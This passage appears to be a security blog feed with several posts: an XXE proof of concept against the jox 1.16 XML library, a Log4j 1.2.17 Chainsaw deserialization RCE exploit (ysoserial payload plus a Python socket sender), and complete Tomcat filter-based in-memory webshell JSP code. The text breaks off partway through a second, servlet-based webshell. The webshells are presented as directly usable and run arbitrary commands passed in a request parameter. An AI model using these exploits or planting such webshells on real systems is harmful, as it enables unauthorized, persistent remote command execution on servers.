    <content type="html"><![CDATA[<p>A component found during a code audit at the customer site.<br>The affected version is &lt;=1.16</p><p><a href="https://mvnrepository.com/artifact/com.wutka/jox/1.16">https://mvnrepository.com/artifact/com.wutka/jox/1.16</a></p><p>According to the official demo, the data will first be passed to the readObject method of JOXBeanInputStream:<br><img src="/images/64/1.png"><br>In the readObejct method of the object JOXBeanInputStream, the parameters will continue to be passed into the readObejct method of the JOXSAXBeanInput class for processing:<br><img src="/images/64/2.png"><br>Follow up with the JOXSAXBeanInput class:<br><img src="/images/64/3.png"><br>In the readObject method of this class, the parse method of SAXParser is called to directly parse the XML document. No other verification is performed, so that the malicious xml data can be used to trigger the vulnerability.</p><p>Vulnerability verification:<br>Reference dependencies in pom files:</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;dependency&gt;<br>      &lt;groupId&gt;com.wutka&lt;/groupId&gt;<br>      &lt;artifactId&gt;jox&lt;/artifactId&gt;<br>      &lt;version&gt;1.16&lt;/version&gt;<br>    &lt;/dependency&gt;<br></code></pre></div></td></tr></table></figure><p>Refer to the official to write a class that calls JOXBeanInputStream to parse xml:</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> com.wutka.jox.JOXBeanInputStream;<br><span class="hljs-keyword">import</span> com.wutka.jox.JOXBeanOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> novy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/10/22 11:22</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Version</span> 1.0</span><br><span class="hljs-comment"> */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BeanXMLMapping</span> </span>&#123;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         Retrieves a bean object for the</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * received XML and matching bean class</span><br><span class="hljs-comment">         */</span><br><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">fromXML</span><span class="hljs-params">(String xml, Class className)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><br>            ByteArrayInputStream xmlData = <span class="hljs-keyword">new</span> ByteArrayInputStream(xml.getBytes());<br><br>            JOXBeanInputStream joxIn = <span class="hljs-keyword">new</span> JOXBeanInputStream(xmlData);<br><br>            <span class="hljs-keyword">try</span> &#123;<br><br>                <span class="hljs-keyword">return</span> joxIn.readObject(className);<br><br>            &#125; <span class="hljs-keyword">catch</span> (IOException exc) &#123;<br><br>                exc.printStackTrace();<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>                <span class="hljs-keyword">try</span> &#123;<br><br>                    xmlData.close();<br><br>                    joxIn.close();<br><br>                &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>                    e.printStackTrace();<br><br>                &#125;<br><br>            &#125;<br><br>        &#125;<br><br></code></pre></div></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jox&quot;)</span><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">joxxml</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String req, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>       BeanXMLMapping aaa = <span class="hljs-keyword">new</span> BeanXMLMapping();<br>       aaa.fromXML(req,TestController.class);<span class="hljs-comment">//TestController.class is arbitrary class added to meet the conditions</span><br></code></pre></div></td></tr></table></figure><p>Finally, send the payload to trigger the vulnerability</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;<br>&lt;!DOCTYPE creds [<br>        &lt;!ELEMENT creds ANY &gt;<br>        &lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;dnslog&quot;</span>&gt;<br>        ]&gt;<br>&lt;creds&gt;<br>    &amp;xxe;<br>&lt;/creds&gt;<br></code></pre></div></td></tr></table></figure><p><img src="/images/64/7.png"></p><p>Refer to:<br><a href="https://blog.csdn.net/lsh364797468/article/details/51325540" title="简单SAX解析详解全过程">简单SAX解析详解全过程</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j1.2.17 RCE</title>
    <link href="/2021/10/28/63/"/>
    <url>/2021/10/28/63/</url>
    
    <content type="html"><![CDATA[<p>Vulnerability discovered in early 2020.</p><p>After reading CVE-2019-17571, I found that there is another vulnerability under chainsaw，there is a deserialization process for socket data in the LoggingReceiver class, and the lack of verification leads to the occurrence of vulnerabilities </p><p>Vulnerability analysis:<br>Set the listening port in the setupReceiver method on line 133 of src/main/java/org/apache/log4j/chainsaw/Main.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setupReceiver</span><span class="hljs-params">(MyTableModel aModel)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> port = <span class="hljs-number">4445</span>;<br>        String strRep = System.getProperty(<span class="hljs-string">&quot;chainsaw.port&quot;</span>);<br>        <span class="hljs-keyword">if</span> (strRep != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                port = Integer.parseInt(strRep);<br>            &#125; <span class="hljs-keyword">catch</span> (NumberFormatException var6) &#123;<br>                LOG.fatal(<span class="hljs-string">&quot;Unable to parse chainsaw.port property with value &quot;</span>+ strRep + <span class="hljs-string">&quot;.&quot;</span>);<br>                JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;Unable to parse port number from&#x27;&quot;</span> + strRep + <span class="hljs-string">&quot;&#x27;, quitting.&quot;</span>, <span class="hljs-string">&quot;CHAINSAW&quot;</span>, <span class="hljs-number">0</span>);<br>                System.exit(<span class="hljs-number">1</span>);<br>            &#125;<br>        &#125;<br><br></code></pre></div></td></tr></table></figure><p>Then go to the LoggingReceiver class to process related connection information:</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            LoggingReceiver lr = <span class="hljs-keyword">new</span> LoggingReceiver(aModel, port);<br>            lr.start();<br><br></code></pre></div></td></tr></table></figure><p>Follow up LoggingReceiver class,get the data in the run method, encapsulate the mClient data into the ObjectInputStream object, Deserializing the ois object triggers the vulnerability:<br>src/main/java/org/apache/log4j/chainsaw/LoggingReceiver.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>            LoggingReceiver.LOG.debug(<span class="hljs-string">&quot;Starting to get data&quot;</span>);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">this</span>.mClient.getInputStream());<br><br>                <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>) &#123;<br>                    LoggingEvent event = (LoggingEvent)ois.readObject();<br>                    LoggingReceiver.<span class="hljs-keyword">this</span>.mModel.addEvent(<span class="hljs-keyword">new</span> EventDetails(event));<br>                &#125;<br><br></code></pre></div></td></tr></table></figure><p>Vulnerability verification:<br>Start the visualization component</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">java -cp log4j-1.2.17.jar org.apache.log4j.chainsaw.Main<br></code></pre></div></td></tr></table></figure><p>Sending the payload generated by ysoserial (<a href="https://github.com/angelwhu/ysoserial">https://github.com/angelwhu/ysoserial</a>) to port 4445 of the target can trigger the vulnerability.</p><p>eg, generate malicious data exp.ser first:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">java -jar ysoserial.jar Jdk7u21 <span class="hljs-string">&quot;calc&quot;</span> &gt; exp.ser<br></code></pre></div></td></tr></table></figure><p>Write a python socket client after generating the data:</p><p>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">import</span> socket<br>s = socket.socket()<br>host = <span class="hljs-string">&quot;172.20.10.14&quot;</span><span class="hljs-comment">#target ip</span><br>port = <span class="hljs-number">4445</span><span class="hljs-comment">#The listening port set by the component</span><br>s.connect((host,port))<br>ssss = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.ser&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)//Malicious data<br>xc = ssss.read()<br>s.send(xc)<br>s.close()<br></code></pre></div></td></tr></table></figure><p>running exp.py can trigger the vulnerability.</p><p><img src="/images/63/1.png"></p><h2 id="OR"><a href="#OR" class="headerlink" title="OR"></a>OR</h2><p>Web demo:</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Log4jVul</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String[] arg = &#123;&#125;;<br>        Main.main(arg);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>When you run the above demo, you will be prompted:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">[main] DEBUG org.apache.log4j.chainsaw.MyTableModel - Total time [ms]: 1 <span class="hljs-keyword">in</span> update, size: 0<br>[Thread-4] INFO org.apache.log4j.chainsaw.LoggingReceiver - Thread started<br>[Thread-4] DEBUG org.apache.log4j.chainsaw.LoggingReceiver - Waiting <span class="hljs-keyword">for</span> a connection<br></code></pre></div></td></tr></table></figure><p>It will prompt to wait for a connection. At this time, sending malicious serialized data to port 4445 will trigger the vulnerability.</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>能直接使用的内存马学习-filter篇</title>
    <link href="/2021/09/16/62/"/>
    <url>/2021/09/16/62/</url>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author <span class="hljs-variable">novy</span></span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date </span>2021/9/16 12:29</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Version </span>1.0</span><br><span class="hljs-comment"> */</span><br><br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.*&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.annotation.WebServlet&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.http.HttpServletResponse&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.io.IOException&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.io.InputStream&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.io.BufferedReader&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span>%&gt;<br>&lt;%@ page language=<span class="hljs-string">&quot;java&quot;</span> contentType=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span>%&gt;<br><br>&lt;%<br>    final <span class="hljs-built_in">String</span> name = <span class="hljs-string">&quot;DefaultTesttFilter&quot;</span>;<br>    ServletContext servletContext = request.getSession().getServletContext();<br><br>    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);<br><br>    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);<br><br>    Field Configs = standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-built_in">Map</span> filterConfigs = (<span class="hljs-built_in">Map</span>) Configs.get(standardContext);<br><br>    <span class="hljs-keyword">if</span> (filterConfigs.get(name) == <span class="hljs-literal">null</span>)&#123;<br>        Filter filter = <span class="hljs-keyword">new</span> <span class="hljs-function"><span class="hljs-title">Filter</span>(<span class="hljs-params"></span>)</span> &#123;<br>            @Override<br>            public <span class="hljs-keyword">void</span> init(FilterConfig filterConfig) throws ServletException &#123;<br><br>            &#125;<br><br>            @Override<br>            public <span class="hljs-keyword">void</span> doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;<br>                HttpServletRequest req = (HttpServletRequest) servletRequest;<br>                <span class="hljs-built_in">String</span> task = req.getParameter(<span class="hljs-string">&quot;taskdilng&quot;</span>);<br>                <span class="hljs-keyword">if</span> (task != <span class="hljs-literal">null</span>)&#123;<br>           InputStream fis = <span class="hljs-keyword">new</span> ProcessBuilder(task).start().getInputStream();<br>        InputStreamReader isr=<span class="hljs-keyword">new</span> InputStreamReader(fis);<br>        BufferedReader br=<span class="hljs-keyword">new</span> BufferedReader(isr);<br>        <span class="hljs-built_in">String</span> line=<span class="hljs-literal">null</span>;<br>        <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">(line=br.readLine())!=<span class="hljs-literal">null</span></span>)</span> &#123;<br>           response.getWriter().println(<span class="hljs-string">&quot;res: &quot;</span>+line);<br>       &#125;<br>        &#125;<br>                filterChain.doFilter(servletRequest,servletResponse);<br>            &#125;<br><br>            @Override<br>            public <span class="hljs-keyword">void</span> <span class="hljs-function"><span class="hljs-title">destroy</span>(<span class="hljs-params"></span>)</span> &#123;<br><br>            &#125;<br><br>        &#125;;<br><br><br>        FilterDef filterDef = <span class="hljs-keyword">new</span> FilterDef();<br>        filterDef.setFilter(filter);<br>        filterDef.setFilterName(name);<br>        filterDef.setFilterClass(filter.getClass().getName());<br>        standardContext.addFilterDef(filterDef);<br><br>        FilterMap filterMap = <span class="hljs-keyword">new</span> FilterMap();<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>        filterMap.setFilterName(name);<br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>        standardContext.addFilterMapBefore(filterMap);<br><br>        Constructor <span class="hljs-title">constructor</span> = <span class="hljs-title">ApplicationFilterConfig</span>.<span class="hljs-title">class</span>.<span class="hljs-title">getDeclaredConstructor</span>(<span class="hljs-params">Context.<span class="hljs-keyword">class</span>,FilterDef.<span class="hljs-keyword">class</span></span>);<br>        <span class="hljs-title">constructor</span>.<span class="hljs-title">setAccessible</span>(<span class="hljs-params"><span class="hljs-literal">true</span></span>);<br>        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) <span class="hljs-title">constructor</span>.<span class="hljs-title">newInstance</span>(<span class="hljs-params">standardContext,filterDef</span>);<br><br>        filterConfigs.put(name,filterConfig);<br>        out.print(<span class="hljs-string">&quot;success !&quot;</span>);<br>    &#125;<br>%&gt;<br><br></code></pre></div></td></tr></table></figure><p><img src="/images/62/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内存马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>能直接使用的内存马学习-servlet篇</title>
    <link href="/2021/09/15/61/"/>
    <url>/2021/09/15/61/</url>
    
    <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author <span class="hljs-variable">novy</span></span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date </span>2021/9/14 9:09</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Version </span>1.0</span><br><span class="hljs-comment"> */</span><br><br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.*&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.annotation.WebServlet&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;javax.servlet.http.HttpServletResponse&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.io.IOException&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.io.InputStream&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.io.BufferedReader&quot;</span>%&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span> = <span class="hljs-string">&quot;java.io.InputStreamReader&quot;</span>%&gt;<br><br><br>&lt;%<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InitTaskServlet</span> <span class="hljs-title">implements</span> <span class="hljs-title">Servlet</span></span>&#123;<br>    @Override<br>    public <span class="hljs-keyword">void</span> init(ServletConfig config) throws ServletException &#123;&#125;<br>    @Override<br>    public <span class="hljs-built_in">String</span> <span class="hljs-function"><span class="hljs-title">getServletInfo</span>(<span class="hljs-params"></span>)</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;<br>    @Override<br>    public <span class="hljs-keyword">void</span> <span class="hljs-function"><span class="hljs-title">destroy</span>(<span class="hljs-params"></span>)</span> &#123;&#125;    public ServletConfig <span class="hljs-function"><span class="hljs-title">getServletConfig</span>(<span class="hljs-params"></span>)</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;&#125;<br>    <br>    @Override<br>    public <span class="hljs-keyword">void</span> service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;<br>        HttpServletRequest request1 = (HttpServletRequest) req;<br>        HttpServletResponse response1 = (HttpServletResponse) res;<br>        <span class="hljs-built_in">String</span> 